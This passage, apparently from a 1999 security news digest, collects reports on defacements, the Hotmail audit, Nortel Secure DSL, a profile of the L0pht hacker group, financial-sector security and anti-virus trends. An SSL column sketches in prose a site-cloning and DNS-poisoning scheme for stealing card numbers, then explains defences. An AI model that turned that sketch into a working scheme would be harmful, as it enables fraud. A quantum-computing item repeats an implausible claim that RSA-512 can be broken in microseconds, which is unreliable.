      credited to them by attrition.org. 

      Global Hell, at least one of whose members recently was been arrested as a
      result of FBI raids, gets credited with 118 hacks. More than 40 other groups
      are credited with anywhere from two to 50 hacks. 

      Some hackers evidently see a credit on attrition.org as a badge of honor, with
      a group called TREATY's hack against IDG Co. claiming in the text of its
      defacement that it was "just doing it" to get mentioned on attrition.org. 

      No contact with hackers

      Unlike many hacks, the r 1 3 9 defacements posted no e-mail contact for the
      group. Hackers are notorious for signing their work and offering a valid, but
      anonymous, mailbox. 

      But Baxter, of Hoffman Bikes, said he suspected some of the e-mail the
      company received in response to its counter-hack were from r 1 3 9 members.

      Those correspondents said they would trade security advice for Matt Gipson
      autographs, the Hoffman sponsored rider. 

      "We offered it to them, but we haven't gotten a response back yet," he said.
      Hoffman has decided against pressing charges or other legal action against the
      hackers even if they did come forward, Baxter said. 

      "It appears we've turned it into a good thing, at least something entertaining.
      But it can be a very, very bad thing. I wish it wasn't possible to do."

      Army studying IT recruitment

      BY BOB BREWIN (antenna@fcw.com)

      The Army has kicked off a yearlong study to help determine how to better
      recruit and maintain its information technology work force, with an emphasis on
      how the service can use financial inducements to attract workers.

      The charter of the Army Information Technology/Information Assurance
      Workforce Issues Study placed compensation first in the list of issues and
      challenges the Army must address to attract and retain IT personnel in a
      technology-driven economy. The study also will look at non-monetary
      inducements. 

      Lt. Gen. Larry Ellis, Army deputy chief of staff for operations and plans, said
      the study will help the Army produce policy and resource recommendations to
      enhance IT recruitment, retention, education and training. 

      In addition, the Army will use the study to develop a table of organization for its
      Force XXI digitized battleforce by next August.

      Gen. John Keane, Army vice chief of staff, described IT and information
      systems as the "dominant" issues the Army needs to keep in mind as it develops
      and fields the digitized battle force. The soldiers and civilian Army employees
      who operate those Force XXI systems "will always remain the linchpin to
      ensure success in information dominance and to counter the continued threats
      and security issues for our information networks,'' Keane said in a Sept. 22
      memo.

      Keane asked the help of all Army IT professionals in developing these new IT
      personnel policies and procedures by filling out an online survey
      (www.itiasurvey.army.pentagon.mil) no later than Nov. 20.

      Truste OKs Hotmail security fixes

      Microsoft has fixed a security hole that threatened the privacy of its 40 million Hotmail users in August, according to
      the results of an outside audit released today.
 
      The announcement disclosed only that a "Big Five" accounting firm reviewed the "nature, extent, and cause of the problem," as
      well as the solutions that Microsoft put in place. As part of the audit, Microsoft employees who fixed the hole were interviewed,
      and the unnamed firm tested the solution to make sure the problem wouldn't reoccur.
 
      As previously reported, the review of Hotmail was commissioned after the service was pulled offline for two hours when it was
      discovered that accounts could be accessed without passwords as long as a user's name--which is commonly found in a Hotmail
      address--was known.
 
      Microsoft said it fixed the problem the same day and has since admitted that the hole was the result of a string of code that
                            hadn't been tested for security.
 
                            Microsoft in August voluntarily agreed to the audit at the request of the Web privacy seal program
                            Truste, which Microsoft generously sponsors. Until today, however, there had been doubts about
                            whether any results of the audit would be made public. 
 
                            "Both Microsoft and Truste have confirmed that we've effectively resolved that incident, and that we
                            are in compliance with Truste's licensing agreement," Richard Purcell, data practices director at
                            Microsoft, said today.
 
                            "The firm had technical experts, and they were careful about reviewing the solutions we put in place
                            at the code level," he added.
 
                            Truste monitors participating sites' privacy practices and ensures that licensees "help protect the
                            security" of the information they collect and store.
 
      Watchdogs skeptical
      Based on guidelines set by the American Institute of Certified Public Accountants (AICPA), which oversees the conduct of major
      firms, Microsoft and others participating in the audit were restricted from releasing the accounting firm's full report.
 
      But consumer advocacy group Junkbusters had called for full disclosure of the report, insisting that if the results weren't made
      public, Hotmail users would have no assurance that their accounts are safeguarded.
 
      Despite the announcement that Hotmail is secure, Jason Catlett, founder of Junkbusters, was not satisfied with the level of detail
      in the companies' announcement.
 
      "All Microsoft and Truste are saying is that someone went in with a notebook and pen and asked questions, but the company is
      not revealing the name of the auditor or the instructions to the auditor--the summary is vague," Catlett said. "They had the chance
      to commission an audit that could have been open."
 
      Specifically, Microsoft had commissioned an "Agreed-Upon Procedures Engagement," in which the parameters of the review are
      set by the certified public account, the client, and usually a specified third party, in this case Truste. The results of this type of
      report can only be made available to those parties, according to the AICPA.
 
      The online industry and the Clinton administration have endorsed so-called privacy seal programs as a way to safeguard
      anonymity. But as more Net users provide valuable personal information in exchange for goods and custom Web content, privacy
      advocates say better laws are needed to shield privacy, because industry guidelines don't come with strong enough enforcement.
 
      Truste says its voluntary efforts are effective.
 
      "From our point of view this does demonstrate that the resolution process we have in place works," said Bob Lewin, executive
      director of Truste.
 
      But for Microsoft, the review only puts to rest concern over the August 20 Hotmail security hole. The company has since been
      investigating programs that people could use to generate false passwords to crack open Hotmail accounts.
 
      "We can't prevent malicious hackers from targeting these platforms," Purcell added. "But it's important to say that we really have
      a strong sense of responsibility about protecting the security of customers' information."

43.0  SECURE DSL TECHNOLOGY

      Nortel Networks has taken the wraps off a network-based secure digital subscriber
      line (DSL) technology. The idea behind the technology, known as Secure DSL, is that
      it stops any electronic incursions or eavesdropping on the "always-on" DSL
      connections that many businesses and serious home users of the Internet are now
      starting to use. The system works by securing each DSL line with network-based,
      packet firewalls, so precluding outside attacks. Full story

      Secure DSL Technology
      By Sylvia Dennis, Newsbytes.
      October 03, 1999

      Nortel Networks [NYSE:NT] has taken the wraps off a
      network-based secure digital subscriber line (DSL)
      technology.

      The idea behind the technology, known as Secure DSL, is that
      it stops any electronic incursions or eavesdropping on the
      "always-on" DSL connections that many businesses and
      serious home users of the Internet are now starting to use.

      The system works by securing each DSL line with
      network-based, packet firewalls, so precluding outside attacks.

      Nortel says that Secure DSL is one element of a suite of new
      capabilities announced today by Nortel Networks to enable
      mass market DSL and will be offered as a new feature on the
      Shasta Subscriber Service System (SSS).

      The SSS consists of a Shasta 5000 Broadband Service Node
      (BSN) with the IP (Internet Protocol) Service Operating
      System (iSOS) and Service Creation System (SCS). The BSN
      was developed by Shasta Networks, a company that Nortel
      acquired in March.

      Nortel says that the Shasta 5000 is currently deployed with
      several service providers around the world which are
      preparing for the transition to mass market deployment of
      DSL and other broadband access technologies.

      Initially, ten DSL service providers are offering the Secure
      DSL service to their subscribers: Cayman Systems,
      CopperCom, Efficient Networks, FlowPoint, Jetstream
      Communications, Netopia, Network TeleSystems, Promatory
      Communications, TollBridge Technologies, and Wind River
      Systems.

      Anthony Alles, Nortel's general manager, said that, because
      DSL lines are typically always connected to the Internet,
      unlike the intermittent, dynamic connections of dialup
      networks, computers attached to DSL lines are exposed to
      Internet security attacks.

      As DSL becomes more widely deployed, he said, increasing
      numbers of DSL subscribers have reported attacks on their
      computers, sometimes leading to copying or destruction of
      sensitive data.

      "It's critically important for the rapid adoption of DSL that the
      DSL industry find an easy, cost-effective solution for securing
      always-on DSL lines," he said.

      Alles said that DSL is a mass market technology, and will be
      widely deployed to residential and small business customers,
      most of whom lack the technical skills and resources to deploy
      and maintain their own security systems.

      "Security is an expectation, not a feature, for the mass market,
      and DSL service providers which do not provide such integral
      security capabilities may find themselves at a severe
      competitive disadvantage," he said.

      Pricing on the Shasta 5000 BSN starts at $30,000 for ISPs and
      other interested carriers.

      Further details of the technology can be found on the Web at

44.0  HACK, COUNTERHACK
      ~~~~~~~~~~~~~~~~~

      by Thejian, Monday 4th October 1999 on 12:40 am CET
      Here's another article on those "eight computer hackers in a dingy warehouse" called
      the L0pht. A bit of history and methodology of the group a long with some interviewing
      quite a good read. Read it       
      
      http://www.nytimes.com/library/magazine/home/19991003mag-hackers.html
      

      HacK, CouNterHaCk 

      The members of L0pht can knock you off line, steal your
      credit-card numbers and cut off the power for your whole
      neighborhood. But they'd like you to think they're the good
      guys. By BRUCE GOTTLIEB Photographs by DANA SMITH 


               Would you like to see how to
               knock someone off the
      Web?" Silicosis asks. 

      Sili, as he is known, is a slim young
      man with serious eyes set deeply into
      a delicate face. He's the newest
      member of a hacker collective known
      as L0pht (pronounced "loft"). He
      becomes visibly uncomfortable when
      asked to talk about himself. He gives
      his age as "mid-20's" and then clams
      up. But when the conversation moves
      to hacking, Sili turns voluble: "I think
      it's a thrill to look at a program and
      figure out how to make that program
      do something that it was never
      designed to do in the first place.
      There's the challenge." 

      We sit down at a computer monitor
      while Sili explains his latest discovery.
      By mimicking messages that typically
      flow between computers on a
      network, he can reach out to almost
      anyone running Windows 95, 98 or
      2000 in a large corporate
      environment, or anyone using a cable
      modem, and forcibly disconnect them
      from the Web. In a demonstration of
      this, he types a one-line command on
      his computer and hits the return key
      with a flourish. Sure enough, the
      computer across the room, which
      seconds before had been connected
      to M.I.T.'s server, is now off line. The
      same technique, Sili explains, can be
      used to take information flowing
      between the Web and your neighbor's
      computer and reroute it into your
      own. A clever hacker could capture a
      neighbor's banking transactions,
      passwords or credit-card information.

      Sili published his research on L0pht's
      Web site in mid-August. The report
      was covered in the computer publication Infoworld and the on-line
      magazine ZDNet. At the time, a Microsoft spokesman, instead of
      denouncing L0pht, expressed the hope to reporters that the group would
      "design a more secure version of the protocol" -- a hackerproof set of
      operating instructions for the computer. 

      This request strikes Sili as especially outrageous. "Why doesn't Ralph
      Nader just redesign the Corvair?" he asks. 

          Nader is something of a role model at L0pht, a confederation of
           eight young hackers who position themselves, incredibly enough,
      as a consumer-advocacy group. But L0pht's tactics are a bit unorthodox:
      breaking into software systems and then posting instructions on how to
      do so on the Web, where they can be picked up by software designers
      and malicious hackers alike. Intrigued, I paid a visit to their workshop. 

      L0pht's "laboratory" is the second floor of a ramshackle warehouse in
      suburban Boston. Predictably, the door to the lab has a sign for the pizza
      man -- "Domino's Knock Loudly." 

      The eight men who make up L0pht allow themselves to be identified only
      by their screen names: Dr. Mudge, Space Rogue, Dildog, Brian Oblivion,
      Kingpin, Silicosis, Weld Pond and John Tan. They look to be in their
      20's or 30's, but their six-room suite is an adolescent geek's fantasy
      clubhouse. One wall is papered with antiquated circuit boards while
      another has a signed picture from Julie, Penthouse Pet. Junk food in the
      cupboard is taken seriously. There are three different kinds of Cheez-Its:
      hot and spicy, plain and white cheddar. 

      The warehouse brims with more than 200 computers ranging from
      state-of-the-art Sun and Digital workstations to nostalgia pieces like
      Commodore 64's and Apple IIe's. Black cables, yellow cables and
      jumbles of thin rainbow-colored wires drip from the ceiling, all jacked in
      to steel racks of oscilloscopes, radio transmitters, D.S.L. modems,
      I.S.D.N. modems, half-opened C.P.U.'s and a 50-foot roof antenna.
      The warehouse also contains several small-scale dummy computer
      networks. 

      L0pht's "research" consists of trying to break into these internal systems.
      Upon discovering a security flaw in commercial-network software, the
      L0phties publish an advisory on their Web site. The advisory is a
      double-edged sword: a detailed description of the flaw ù enough
      information for other hackers to duplicate the "exploit" ù and a solution
      that tells network administrators how to close the loophole. 

      L0pht's unorthodox methods have garnered praise from very unlikely
      quarters. Sixteen months ago, L0pht appeared before the Committee on
      Governmental Affairs of the United States Senate. Senator Fred
      Thompson introduced L0pht not as a "gang" nor even a "group," but,
      translating for Washington pols, as a "hacker think tank." 

      L0pht wowed the committee by reeling off an alarming list of security
      holes in public and private systems. After the presentation, Senator
      Lieberman gushed, "It is probably not what you came to hear, but
      actually, I think you are performing an act of very good citizenship and I
      appreciate it." Lieberman went on to compare L0pht, in a single
      sentence, to both Rachel Carson and Paul Revere. "You are performing
      a valuable service to your country," Thompson added, "and we
      appreciate that and want you to continue." 

      The National Security Council is equally bullish on L0pht. I met the
      N.S.C.'s director of information protection, Jeffrey Hunker, at Defcon,
      an annual three-day "conference" attracting more than 2,000 computer
      hackers from around the country. Hunker had come to talk about
      President Clinton's initiatives on computer security (and to spy on
      hackers, if you believe the whispers). He surprised me by raving about
      the group's technical sophistication. "L0pht has carved out an interest-ing
      niche for itself," he added, "and for similar-minded people ù
      white-hatted hackers. Their objective is basically to help improve the
      state of the art in security and to be a gadfly, so to speak ù to identify
      products that have vulnerabilities and make certain those vulnerabilities
      get fixed." 

      When I told L0pht about Hunker's comments, they rolled their eyes,
      saying, "You're not going to publish that, are you?" 

      For one thing, they had no wish to be identified as favorites of the
      N.S.C., since that might jeopardize their standing among so-called
      black-hat, or malicious, hackers. "We are all extremely ethical and
      moral," one member allowed, "but we're not white-hat hackers. We have
      our own moral and ethical standards" ù the term is gray-hat. 

      It's not hard to spot the reasons
      for the moral ambiguity. In their
      off hours, Mudge and Dildog
      are members of Cult of the
      Dead Cow, a black-hat hacker
      group that recently released
      Back Orifice 2000 (bo2k), a
      computer program that enables
      a hacker to control another
      computer from afar. (The name
      is a crude play on Microsoft's
      Back Office Server, a program
      that allows a legitimate
      administrator to, among other
      things, control another
      computer on a network.) But unlike Back Office, bo2k is "invisible,"
      meaning that a hacker can spy on another user, even change files, without
      the user's knowledge. Dildog, one of bo2k's authors, euphemistically
      describes it as "a shy program." Jason Garms, the former head of
      Microsoft's security-response team, is a bit more direct, labeling b02k "a
      malicious program, with malicious intent." 

      Perhaps because of their ties to the black-hat community, L0pht
      members refuse to be identified, although they will let themselves be
      photographed. As Space Rogue explains (and any hacker knows),
      pictures are next to useless if you're trying to dig up private data on
      someone. 

      When L0pht testified before the Senate, members would not accept
      checks for hotel and travel expenses. As with members of the Witness
      Protection Program who have come before the Senate, they were
      reimbursed with cash. Senator John Glenn even signed pictures ù with
      the group's screen names: "To Dr. Mudge. . . . To Space Rogue. . . . To
      Weld Pond." 

            Open up the raincoat to expose all the little parts," is how Mudge,
             smiling, describes L0pht's ethos. Mudge will not disclose his
      age, but mid-30's seems a good guess. He claims a college degree in
      music with further course work in computer science. Mudge says that
      early experimenting with computers led to informal warnings from certain
      "three-letter agencies." He wears his hair below his shoulders, sports a
      goatee and favors faded jeans and a T-shirt. In his Senate testimony he
      claimed to have given training seminars at NASA and the National
      Security Agency. 

      Mudge frankly admits that he'll answer anyone's technical questions
      about hacking. "If a black hat approaches us and says, Hey, this is the
      project or problem I'm looking at . . . we'll talk to them, no problem.
      And if a government agency approaches us and says, How do you do
      this, or, How does this work, we'll talk to them." 

      Of course, this laissez-faire attitude has its costs. Mudge says: "Full
      disclosure is something we had to grapple with for a long time. The flip
      side is that critics say, 'You're giving people tools that can actually do
      bad things.' That is absolutely true. It's got a lot of nasty side effects." 

      For instance: last December, a hacker magazine called Phrack disclosed
      a flaw in a network program called Cold Fusion. (Network programs
      help manage computers that are linked together). In April of this year,
      Weld Pond ù an older, thoughtful L0pht programmer ù discovered a
      second, more serious way to exploit the flaw. 

      Weld immediately published an advisory on L0pht.com prescribing a fix.
      Weld's report also contained enough detail to explain the flaw to
      so-called "script kiddies" ù young, malicious hackers with limited
      technical expertise who are among the most avid readers of L0pht's
      advisories. In the span of three weeks, according to PC Week, hackers
      inserted bogus text and images on at least 100 Cold Fusion systems,
      including those of NASA, the Army and the National Oceanic and
      Atmospheric Administration. 

      So why didn't L0pht contact Allaire, the small Cambridge, Mass.,
      software firm that makes Cold Fusion, before releasing an advisory? The
      reason, say Weld and the other L0phties, is that vendors usually sweep
      tips from hackers under the rug. Vendors, claims L0pht, don't want
      customers to think software has flaws. "We were trained by the vendors
      to go public," says Mudge, "to give them a black eye." 

      With an attitude like this, it's tempting to blame Weld Pond, especially
      since L0pht's advisory led to more security breaches than would have
      occurred had nothing ever been reported. It's not enough to claim, as
      Weld does, that "We try to stay somewhat neutral ù we're not on the
      vendor's side, we're not on the hacker's side. When we release the tools,
      they can be used for good or bad. It's up to the individuals to have
      morals." 

           Mudge is currently writing a paper on a longtime hobbyhorse of his:
            the vulnerability of electrical power grids to hacker attacks.
      While the computers that control these power grids are not directly
      connected to the Internet, Mudge thinks a hacker could still turn out the
      nation's lights because utility companies have left the keys to their
      computers under the proverbial doormat. 

      Mudge tells me that careless utility employees often put internal
      documents on public servers ù perhaps to access them from home or
      while on the road. Sometimes, Mudge claims, the documents explain
      how to access the central computers. Central computers "might have no
      attachment to the Internet," he says, "other than the fact that somebody
      put up a document on the Internet describing how to get to it and how to
      use it." Mudge pauses. "Well, that's just as good." 

      Mudge has written a program to scan utility companies' Web sites for
      words like "confidential" or "password." "I'm not breaking any laws by
      doing this, I'm just grabbing public stuff," he is quick to point out. "They
      don't realize that they're putting it up there for the world to see." 

      He shows me a file downloaded from a large utility company that
      contains a presentation on company security. Next he opens a file full of
      phone numbers from another utility company. "It sounds almost
      science-fictionist," he cautions, "but with these numbers here I'd be able
      to turn off their entire grid." The phone numbers, he explains, connect to
      modems linked to the central switches that determine where electricity
      flows. "If I don't publish this information," Mudge claims, "someone else
      will come along and do the same thing, with less ethical goals. Now you
      can see a situation where people are dying because of these
      corporations' stupidity. At that point, who's to blame?" 

      Given the stakes, Mudge intends to relax his commitment to so-called full
      disclosure. "It's uncool," he says, for utility companies to "learn about a
      problem by reading it in the newspaper." That's why he plans to alert
      companies in advance, so they can close vulnerabilities before the news is
      made public on L0pht's Web site. 

           Like Nader, the L0pht members can get a bit preachy on the subject
           of ethics. "Any of us could leave L0pht right now and take
      six-figure jobs," Mudge says. "The fact that we don't and we're on the
      ramen-noodle, mac-and-cheese diet, that speaks for our ethics right
      there. It's not a job for us; this is what drives us through life." 

                          While Mudge's self-righteousness may be
                          justified up to a point, there are also more
                          prosaic reasons for working at L0pht.
                          Freedom to do whatever you want, for
                          instance. Silicosis and Brian Oblivion are
                          installing a motor-driven satellite dish on the
                          warehouse roof. They hope to capture
                          ground-to-space communications from the
                          Space Shuttle and high-resolution images of
                          the earth broadcast from satellites. The
                          justification? It's cool. Silicosis adds, "It
                          impresses my girlfriend." 

                          Space Rogue ù a sort of young Archie
                          Bunker figure, to the extent that an Archie
                          Bunker figure can be young ù sticks closer to
                          earth when asked how he ended up at L0pht.
      "I did one semester in college, said the hell with this and got out.
      Controlled learning environments have never been my strong point."
      L0pht gave him a place to pursue projects at his own pace. 

      Mostly, Space Rogue seems to like L0pht for the camaraderie. "I moved
      to Boston in 1990," he says, "and I almost immediately met all these
      people on line on local bulletin boards. L0pht started shortly thereafter in
      fall '91. So I'd already known these people awhile, even face to face.
      The on-line world at the time was very small." 

      Mudge recalls that the group took off when members moved their
      computers from their living rooms to a small loft space in Boston. (All but
      one of the founders, Brian Oblivion, have since left.) L0pht soon added
      members and moved to a larger suburban warehouse four years ago. It
      has also started a consulting business on the side called L0pht Heavy
      Industries. 

           L0pht is not without critics, of course. "While L0pht puts on the
           Robin Hood mantle of fighting the big computer companies," a
      senior programmer at Microsoft tells me, "their only victims are the little
      people that are customers" ù the people who purchase products like
      Windows 2000. 

      Microsoft has been on the business end of several L0pht advisories, most
      notably when Mudge and Weld demonstrated how to decrypt
      passwords from computers running Microsoft's NT operating system.
      Jason Garms, the former head of Microsoft's security-response team,
      admits that hackers have a role in creating secure software. But he's wary
      of the Darwinian notion that hackers will, by actively looking for flaws,
      expose inferior products. He likens it to improving public safety by
      painting a target on everyone's head. 

      I mentioned Garms's criticism to the L0pht members, who were equally
      dismissive. If gray-hat hackers stopped searching for vulnerabilities,
      L0pht believes, a black-hat hacker would find them sooner or later. It's
      better to get rid of flaws than hope no one finds them. The N.S.C.'s
      Hunker shares this belief ù the hackers are already out there" ù which
      is why he applauds L0pht for keeping vendors honest. 

      The senior Microsoft programmer also warns that Mudge and his
      colleagues, for all their highfalutin apologia, are motivated mostly by
      naked ego: "I am certain," he says, "that the primary motivation of these
      people is simple self-gratification and justification." 

      I asked the L0pht members whether ego played a part in their ethical
      reasoning. Weld Pond replied that, by assuming pseudonyms, they more
      or less deny themselves the benefits of celebrity. "When I walk down the
      street," he says, "no one knows I'm Weld Pond." 

      But at Defcon, the annual hacker convention, it was quite clear that
      everyone knew Weld, Mudge, Space Rogue and Dildog. L0pht
      members have become, as Mudge notes wryly, "rock stars of the
      computer underground." That they help malicious hackers as well as the
      Feds and big business hasn't hurt their popularity among the outlaws. 

      On the other hand, L0pht's poorly hidden hunger for the spotlight
      shouldn't obscure the truly fascinating work they've done. Socially
      important research is perfectly compatible with, and perhaps inseparable
      from, love of celebrity, as James Watson has made admirably clear. Say
      what you will, there is no denying that L0pht's advisories have improved
      computer security even as they have harmed corporations and
      government agencies. 

      No one doubts that information security is going to become an
      increasingly critical topic as the ordinary economy moves into the digital
      age. In their grander moments, L0pht's members hope to become digital
      Ralph Naders, making sure that the software behind the transition is as
      safe as manufacturers say. 

      The idea of eight computer hackers in a dingy warehouse insuring the
      safety of the information age may sound a little farfetched. But sometimes
      hackers eventually direct their curiosity toward laudable ends. Take, for
      example, the two young hackers who engineered a small blue box in the
      early 1970's that allowed free long-distance calls when placed near a
      telephone receiver. The two enterprising techies went door to door in the
      Berkeley dorms, selling the devices. Their names? Steve Jobs and Steve
      Wozniak, future founders of Apple Computer.

      Law School this fall.

     After an Israeli research institute said it could break
     Europe's banking codes in less than a second, a initiative
     has been launched that could result in unbreakable codes. 
   
     The European Institute of Quantum Computing Network
     was launched on Monday, to bring companies and
     research labs throughout Europe together in the hope that
     the new technology - Quantum Computing - can be taken
     from the theory to the high street. 
   
     The institute was founded a few weeks after news leaked
     from the Israel's Weizmann Institute that it was using a
     mixture of quantum computing and special optical
     technology to break the RSA-512 code, the system used
     by the European banking system. It claims it has
     developed a hand-held device that can break the code in
     12 microseconds. 
   
     Quantum computing works by taking advantage of the
     peculiar characteristics of subatomic particles. Whereas a
     normal computer relies on a signal - or bit - being either
     on or off, a quantum bit can be both on and off at the
     same time. This unusual ability means a great deal more
     information can be stored. While a regular computer
     works through each sum one at a time, a quantum
     computer can do every operation at the same time. 
   
     This, the EIQC says, offers, "not just incremental
     improvements, but a fundamental breakthrough" in
     computing power - enough for code-breaking,
     voice-recognition and translating computers to be simple
     to build. 
   
     The second aspect of Quantum computing, however, will
     help to make information more secure. Using a feature
     called "quantum entanglement", information could be sent
     between two computers that could not be eavesdropped
     upon without the two computers' knowledge. Because
     quantum physics dictates that monitoring a subatomic
     particle changes its state; not only would an eavesdropper
     announce his presence, but the message would be
     garbled. 
   
     "A hacker wouldn't know where to start," says Jonathan
     Curtis of Quantum Electronic Devices. 
   
     As one member of EIQC, who wished to remain
     anonymous, predicts: "While quantum computers may be
     some time off, when they are available no communication
     will be secure unless it is quantum."

      U.S. aims to fight attacks on financial systems

      The U.S. Treasury Department on Friday opened a center intended to help the financial services industry and the government share information about cyber
      attacks and threats. 
    
      The Financial Services Information Sharing and Analysis Center was formed following a directive from President Clinton that the Treasury Department work
      with the banking and finance sectors to find ways to improve security of information systems, according to a written statement issued Friday from the
      department. 
    
      The center was officially announced by U.S. Treasury Secretary Lawrence Summers and is being supported by the U.S. Securities and Exchange
      Commission and the Federal Reserve Board. A dozen financial services companies have said they are interested in participating in the center, according to
      the statement. 
    
      "When I first joined the Treasury some years ago, I can assure you we were not thinking about threats to the financial system emanating from viruses, Trojan
      horses, logic bombs, or malicious code," Summers said in a prepared statement delivered when he announced the center Friday morning. "But we are
      thinking about those things now, and with good reason." 
    
      The pervasive use of the Internet by individuals and financial institutions has led to new needs when it comes to security, he said. A study last year by the
      Computer Security Institute found that among companies polled, 64 percent had information system security breaches, up 16 percent over 1997, he added.
      The total financial loss from the breaches rose 36 percent in a year. 
    
      "As damaging as these attacks have been, the vast majority has been conducted by disgruntled individuals," Summers said in his written remarks. "We face a
      future, though, where criminals, terrorists or even nation-states may use the same tools in a more organized way for darker purposes." 
    
      The new center, Summers said, "can play a key role in bolstering the confidence of the American public in the security and stability of our financial system" by
      enabling the financial industry and the government to share details about cyber attacks and how to quell them. 
    
      Additional information about the center had not been posted on the Treasury Department Web site as of Friday afternoon. The department, in Washington,
      can be reached at www.ustreas.gov.

      Special Kurt's Closet: Is SSL dead?

      Kurt Seifried, seifried@seifried.org, for http://www.securityportal.com/
      September 30, 1999 - The title is a bit scary, but I wanted to get your
      attention (worked, didn't it?). Most security experts have been aware of problems
      with SSL, but generally speaking we haven't said much because there wasn't
      much of a replacement available for it, and it hasn't been exploited extensively
      (chances are it will be, though). I'll start with an explanation of the basic
      attack, followed by some methods to protect yourself, and finish with an
      interview with Dale Peterson of DigitalBond and the summary.
      How to do it 
      Let's say I want to scam people's credit card numbers, and don't want to break into a server. What if I could get
      people to come to me, and voluntarily give me their credit card numbers? Well, this is entirely too easy.
      I would start by setting up a web server, and copying a popular site to it, say www.some-online-store.com, time
      required to do this with a tool such as wget is around 20-30 minutes. I would then modify the forms used to submit
      information and make sure they pointed to my server, so I now have a copy of www.some-online-store.com that looks
      and feels like the "real" thing. Now, how do I get people to come to it? Well I simply poison their DNS caches with my
      information, so instead of www.some-online-store.com pointing to 1.2.3.4, I would point it to my server at 5.6.7.8.
      Now when people go to www.some-online-store.com they end up at my site, which looks just like the real one. 
      How to prevent being taken
      Most forms online are not on secure servers, but the data you provide is usually sent to a secure server, which leads
      to one of the major problems. The form data may not be going where it should. A simple attack is to have the fake
      site, and a form that takes the data, without using a secure server at all. How many of you actively check the source
      HTML of pages you are plugging your credit card data into? The title bar should start with https:// followed by the
      sitename (i.e.: https://www.microsoft.com/). You should also examine the HTML source to make sure the form data
      points to where it should go, you should see something like:
  
    &lt;form method="POST" action="/order.cgi">
  
      or:
  
    &lt;form method="POST" action="https://www.some-online-store.com/cgi-bin/order.cgi">
  
      If a store is using the "GET" method, do not buy from them, any data you enter will be passed along as the query
      string, if you look in the text of your address bar you will see your credit card info. If a store specifies a relative link
      (i.e.: /something/something.cgi) then make sure the current site you are at is a secure server, and that the certificate
      is legitimate. If the link is absolute, and points to an IP address, be suspicious, I personally would not buy if this were
      the case. Ideally the link should point to something like "https://www.some-online-store.com/cgi-bin/order.cgi", and
      you should first browse to that site, and make sure the certificate is legitimate, before hitting the submit button on
      your order form. Most current SSL attacks are based on fooling the user, more so than breaking the technology. If you
      are vigilant, and check certificates before you submit to sites you will be a little safer (but not completely).
      SSL Certificates contain various pieces of information, such as who issued them, when it was issued, when it expires,
      who it was issued to and so forth. Who it was issued to (usually the "subject") is a very important field, and the issuer
      field. To view the certificate details double click on the lock icon, usually at the bottom left of the screen in Netscape,
      and at the bottom right in Microsoft Internet Explorer. Let's take https://www.microsoft.com/ for example, the Issuer
      field looks like:
  
    OU = Secure Server Certification Authority
    O = RSA Data Security, Inc.
    C = US
  
      The C stands for country, the O for organization (usually the company's name), and the OU stands for organizational
      unit (a division of the company). The subject field looks like:
  
    CN = www.microsoft.com
    OU = mscom
    O = Microsoft
    L = Redmond
    S = Washington
    C = US
  
      The S stands for state, the L for locality (the city), and the CN is the certificate name (the site it applies to). Make
      sure all these are spelt correctly, many attackers will use domain names that look familiar (such as miicrosoft.com) in
      order to get legitimate certificates. Taking these precautions every time you use an SSL secured service is tedious,
      and underlines one of the major flaws with SSL, in that is susceptible to "social engineering" attacks. Another flaw in
      SSL is that it only secures the session, it doesn't secure any actually transaction. This means if someone does steal
      your credit card number and use it online, it is almost impossible to prove that it wasn't actually you that issued the
      order. SSL does allow for the client to authenticate to the server, however very few people have digital certificates
      compatible with this (I have one, and know of perhaps a half dozen other people, a definite minority). In addition to
      this the major certificate vendors have stopped issuing the personal certificates that guarantee the person's identity,
      so they are a dead end. There are newer protocols and systems that allow for two parties to safely conduct
      transactions with all these features.
      The following is an interview with Dale Peterson of DigitalBond (www.digitalbond.com). DigitalBond is currently working
      on a product to secure Internet transactions, and is targeted at brokerage houses which have many thousands of
      users on a daily basis, making them an especially tempting target.
  
      Kurt: Is SSL dead?
      Dale: No.  It is a fine session encryption protocol.  The editor for the TLS
      (new name for latest version of SSL) spec works at Certicom and is our
      partner.  I've talked this over with him, and he is very insistent
      that SSL is not broken.  But he does say it suffers from all the
      problems we have discussed in these emails and could be augmented with
      a transaction protocol.
      I think that it certainly shouldn't be the protocol for most
      e-commerce transactions, but for the exchange of private data over the
      Internet it is ok.
      Kurt: What do you envision replacing SSL?
      Dale: We see a lot of businesses that are doing two-party transactions.
      Nice and simple, unlike the multi-party bank card model that SET
      addresses.  We have developed a two-party transaction security model
      that we thinks meets the needs of Internet Brokerages, Internet
      prescription drugs, and other two-party transactions.  It is being
      reviewed by Carnegie Mellon University, and they will publish a paper
      this year.
      Kurt: Should we be educating users about these technologies? Do they care?
      Dale: The most important education needed is that SSL transactions are not
      secure.  The whole Internet community has been fed this baloney
      because SSL was around and easy.  I have found it difficult getting
      reporters to even believe this vulnerability exists, even with a live
      demo.  The response is "That can't be true.  We would all know about
      this if that were true".  That is why I think this story will be big
      when it breaks in the mainstream press.
  
      Summary:
      SSL is NOT dead. It is just an inappropriate security system for many Internet based transaction systems. As with
      many things on the Internet the growth of online sales, and especially the growth of online brokerages has been
      stupendous. SSL was simply not designed with systems like these in mind, and systems like DigitalBond are attempting
      to fix this. Chances are in 5 to 10 years that the existing systems will be found to be "weak", and replaced with better
      systems.

      Virus protectors get a brand new bag
      By Robert Lemos, ZDNN

      VANCOUVER, Canada -- Anti-virus software is quickly going the way of the browser -- soon
      to be free and ubiquitous, said industry insiders Friday at the Virus Bulletin99 conference. 
      
      Soon, every user will get free detection software, with security firms selling updates via the Internet
      at a monthly fee. Anti-virus services will also be sold to Internet Service Providers for resale to
      users. 
      
      "In the future it won't be about protecting computers against viruses, but content security," said
      Larry Bridwell, program technology manager for security firm International Computer Security
      Association.
      
      With the number of threats against computers increasing -- viruses, hackers, privacy-invading
      companies, and good old-fashioned bugs, to name a few -- keeping content safe and the
      computer running is now Job No.1. 
      
      Consumers' desire for a single fix-it package is changing the economics of the industry, admitted
      Carey Nachenberg, chief scientist for the Symantec Anti-virus Research Center. 
      
      "We're all afraid the retail channel will dry up," he said. 
      
      Viruses with sneakers
      An even more important factor: Viruses infecting computers via e-mail move far too quickly for
      companies to rely on manual updates to their software. 
      
      Last spring, for example, the Melissa virus infected hundreds of thousands of computers within 48
      hours. "We're at a turning point right now," said Nachenberg in a keynote speech Thursday. "We
      need to re-examine our anti-virus software, and companies need to re-examine their anti-virus
      strategies."
      
      Symantec (Nasdaq:SYMC) is taking a two-pronged approach to the problem. With partner IBM
      Corp. (NYSE:IBM), the anti-virus software maker is nearing completion of its "Digital Immune
